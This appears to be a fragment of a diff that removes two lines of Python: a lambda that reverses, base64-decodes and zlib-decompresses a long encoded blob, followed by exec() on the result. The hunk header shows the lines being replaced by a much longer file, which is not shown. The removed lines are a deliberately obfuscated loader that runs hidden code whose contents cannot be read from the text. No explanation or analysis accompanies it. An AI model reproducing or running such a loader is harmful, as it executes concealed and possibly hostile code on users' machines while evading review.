@@ -1,2 +1,1089 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=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